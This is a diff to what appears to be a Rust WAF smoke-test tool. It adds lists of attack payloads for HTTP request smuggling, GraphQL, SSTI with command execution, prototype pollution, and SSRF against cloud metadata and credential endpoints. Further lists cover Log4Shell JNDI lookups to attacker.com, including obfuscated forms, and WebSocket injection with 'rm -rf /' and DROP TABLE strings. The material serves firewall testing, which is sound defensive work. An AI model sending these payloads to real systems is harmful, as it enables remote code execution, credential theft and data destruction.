@@ -264,6 +264,93 @@ impl WafSmokeTest {
             ],
         );
 
+        // HTTP Request Smuggling
+        payloads.insert(
+            PayloadType::HttpRequestSmuggling,
+            vec![
+                "POST / HTTP/1.1\r\nHost: target\r\nContent-Length: 0\r\nTransfer-Encoding: chunked\r\n\r\n".to_string(),
+                "POST / HTTP/1.1\r\nHost: target\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nG".to_string(),
+                "GET / HTTP/1.1\r\nHost: target\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding: identity\r\n\r\n".to_string(),
+                "GET / HTTP/1.1\r\nHost: target\r\nTransfer-Encoding: ch\x00unked\r\n\r\n".to_string(),
+            ],
+        );
+
+        // GraphQL Injection
+        payloads.insert(
+            PayloadType::GraphQLInjection,
+            vec![
+                r#"{"query": "{ __schema { types { name } } }"}"#.to_string(),
+                r#"{"query": "{ __type(name: \"User\") { fields { name type { name } } } }"}"#.to_string(),
+                r#"query { user(id: "1") { name } user(id: "2") { name } }"#.to_string(),
+                r#"query { alias1: user(id: 1) { password } alias2: user(id: 2) { password } }"#.to_string(),
+                r#"mutation { updateUser(id: 1, role: "admin") { id role } }"#.to_string(),
+            ],
+        );
+
+        // Server-Side Template Injection (SSTI)
+        payloads.insert(
+            PayloadType::SSTI,
+            vec![
+                "{{7*7}}".to_string(),
+                "${7*7}".to_string(),
+                "#{7*7}".to_string(),
+                "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}".to_string(),
+                "{{_self.env.registerUndefinedFilterCallback(\"exec\")}}".to_string(),
+                "${{7*7}}".to_string(),
+                "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}".to_string(),
+            ],
+        );
+
+        // Prototype Pollution
+        payloads.insert(
+            PayloadType::PrototypePollution,
+            vec![
+                r#"{"__proto__": {"admin": true}}"#.to_string(),
+                r#"{"constructor": {"prototype": {"admin": true}}}"#.to_string(),
+                r#"{"__proto__": {"isAdmin": true, "role": "admin"}}"#.to_string(),
+                "?__proto__[admin]=true".to_string(),
+                "?constructor[prototype][admin]=true".to_string(),
+            ],
+        );
+
+        // Server-Side Request Forgery (SSRF)
+        payloads.insert(
+            PayloadType::SSRF,
+            vec![
+                "http://169.254.169.254/latest/meta-data/".to_string(),
+                "http://metadata.google.internal/computeMetadata/v1/".to_string(),
+                "http://169.254.169.254/metadata/instance".to_string(),
+                "http://169.254.169.254/latest/meta-data/iam/security-credentials/".to_string(),
+                "http://localhost:8080/admin".to_string(),
+                "http://127.0.0.1:6379/".to_string(),
+                "file:///etc/passwd".to_string(),
+            ],
+        );
+
+        // Log4Shell (Log4j RCE)
+        payloads.insert(
+            PayloadType::Log4Shell,
+            vec![
+                "${jndi:ldap://attacker.com/a}".to_string(),
+                "${jndi:rmi://attacker.com/a}".to_string(),
+                "${${lower:j}ndi:${lower:l}dap://attacker.com/a}".to_string(),
+                "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attacker.com/a}".to_string(),
+                "${jndi:dns://attacker.com}".to_string(),
+                "${${env:ENV_VAR:-j}ndi:ldap://attacker.com/a}".to_string(),
+            ],
+        );
+
+        // WebSocket Injection
+        payloads.insert(
+            PayloadType::WebSocketInjection,
+            vec![
+                r#"{"type":"message","data":"<script>alert('XSS')</script>"}"#.to_string(),
+                r#"{"cmd":"exec","args":"rm -rf /"}"#.to_string(),
+                "Upgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Key: x3JJHMbDL1EzLkh9GBhXDw==\r\nSec-WebSocket-Protocol: <script>alert(1)</script>".to_string(),
+                r#"{"event":"subscribe","channel":"'; DROP TABLE users; --"}"#.to_string(),
+            ],
+        );
+
         payloads
     }
 
